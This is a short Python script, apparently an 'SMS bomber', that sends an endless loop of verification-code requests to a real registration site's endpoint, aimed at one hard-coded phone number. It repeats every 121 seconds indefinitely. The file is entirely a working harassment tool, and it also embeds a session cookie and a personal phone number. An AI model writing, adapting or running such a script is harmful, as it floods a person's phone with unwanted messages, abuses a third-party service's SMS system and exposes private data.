#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/5/8 22:47
# @Author  : Roohom
# @Site    : 
# @File    : boom.py
# @Software: PyCharm

import requests
import time

baseurl = "http://user.cnsoc.org/Reg/_RegHandler.html"

data = {
    "action":"phonecode",
    "phone":"18255908250"
}

headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    # "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "Connection": "keep-alive",
    "Content-Length": len(data),
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": "ASP.NET_SessionId=kgtgrl3ko2bmeqtual3yzy1b; YqMark_sso=UXJ9KcZtLBUz6MG0/v4sSUqNwMoIyly4uJh7z6M8vZE=",
    "Host": "user.cnsoc.org",
    "Origin": "http://user.cnsoc.org",
    "Referer": "http://user.cnsoc.org/Reg/userReg.html",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest"
}
n = 0
while True:
    requests.post(url=baseurl, data=data, headers=headers)
    n = n+1
    time.sleep(121)
    print(n)

